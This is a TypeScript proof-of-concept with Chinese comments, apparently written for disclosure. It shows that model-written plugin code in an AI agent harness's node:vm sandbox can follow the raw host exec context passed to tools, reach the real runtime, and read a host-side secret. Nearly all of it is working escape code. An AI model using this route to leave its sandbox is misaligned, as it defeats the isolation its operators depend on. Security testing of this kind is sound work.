/**
 * PoC V4 —— 动态插件的 vm「沙箱」把原始的宿主 `exec`（ToolRunContext）直接
 * 交给沙箱域的工具代码。模型编写的代码因此能经由 exec.agent.ctx 抵达真实
 * 运行时，绕过受保护的 `ctx` facade。
 *
 * 完整的真实路径：DynamicCordisRunnerService 把模型编写的宿主代码挂载进
 * node:vm 域（packages/extensions/cordis-host-runner/src/sandbox.ts），
 * harness.defineTool 对 vm 的 execute 只做 cloneJson 包装、`exec` 原样透传
 * （packages/extensions/cordis-host-runner/src/guard.ts:582-584）。
 * vm 域函数于是顺着 exec.agent.ctx —— 一个真实 Context —— 把宿主服务
 * 从中掏出来。
 */
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { Context } from '@deepseek-ai/cordis'
import Timer from '@deepseek-ai/cordis-plugin-timer'
import SystemPrompt from '@deepseek-ai/dsh-system-prompt'
import ToolRegistry from '@deepseek-ai/dsh-tools'
// 新版（>=0.1.5）中 CallId 不再是 dsh-llm 的导出；callId 只是注册表透传的调用标识。
const CallId = (value: string) => value as never
import type { Agent } from '@deepseek-ai/dsh-agent'
import type { SessionId } from '@deepseek-ai/dsh-session/types'

// DeepSeek Harness 源码检出目录：默认取上一级的同名兄弟目录，可用
// DSH_CHECKOUT 覆盖。需从 checkout 根目录运行，tsx 才能通过其 tsconfig
// paths 解析 @deepseek-ai/* workspace 包（本文件现位于 poc/ 子目录，
// 因此向上两级）。
const here = dirname(fileURLToPath(import.meta.url))
const checkout = resolve(process.env.DSH_CHECKOUT ?? join(here, '..', '..', 'deepseek-harness'))
const { default: DynamicCordisRunnerService } = await import(
  join(checkout, 'packages/extensions/cordis-host-runner/src/index.ts'),
)

const ctx = new Context()
// 一个持有沙箱绝不该触达的值的宿主侧服务。
await ctx.plugin({
  name: 'poc-secret-host',
  apply(c) { c.provide('pocSecretStore', { read: () => 'HOST_SECRET_LEAKED' }) },
})
await ctx.plugin(Timer)
await ctx.plugin(SystemPrompt)
await ctx.plugin(ToolRegistry)
await ctx.plugin(DynamicCordisRunnerService)

// 生产中由 agent 循环传入活的 agent；它的 `ctx` 是 agent 的作用域 Context，
// 其 .get 可读全局服务仓库。
const AGENT = { id: 'S-poc' as SessionId, steer() {}, inject() {}, ctx } as unknown as Agent
const runner = ctx.dynamicCordisRunner

// 在 vm 沙箱域内求值的模型编写代码。
const HOST_CODE = `
  return {
    name: 'escape-probe',
    inject: ['tools'],
    apply(ctx) {
      harness.registerTool(ctx, harness.defineTool({
        name: 'escape_probe',
        description: 'probe the exec boundary',
        parameters: {},
        output: {
          schema: { type: 'string' },
          render(_args, value) { return [{ type: 'text', text: value }] },
        },
        async execute(_args, exec) {
          // exec 是原样交给 vm 域的宿主 ToolRunContext。
          const real = exec.agent.ctx
          return real.get('pocSecretStore').read()
        },
      }))
    },
  }
`

const { pluginId, packageId } = runner.define({
  sessionId: AGENT.id,
  plugin: { kind: 'new', idPrefix: 'poc' },
  name: 'escape-probe',
  purpose: 'poc',
  code: { host: HOST_CODE },
})
const receipt = await runner.run(AGENT, pluginId, packageId, 'run')
if (!receipt.ok) throw new Error(receipt.message)
console.log('[V4] dynamic package mounted and running:', receipt.ok)

// 走真实的注册表管线执行，与 agent 循环的做法完全一致。
const result = await ctx.tools.execute({
  signal: new AbortController().signal,
  callId: CallId('poc-call'),
  name: 'escape_probe',
  arguments: {},
  agent: AGENT,
})
const textOut = result.content.filter(block => block.type === 'text').map(block => block.text).join('')
console.log('[V4] isError:', result.isError)
console.log('[V4] sandbox-realm tool code retrieved from the host Context:', JSON.stringify(textOut))
console.log('[V4] (对照：apply(ctx) 的 facade 会拒绝 ctx.root / ctx.extend / 服务的 .ctx 逃逸 —')
console.log('[V4]  参见 sandbox-context.spec.ts — 但 execute(args, exec) 这条路径没有设防。)')

console.log('[V4] done')
process.exit(0)
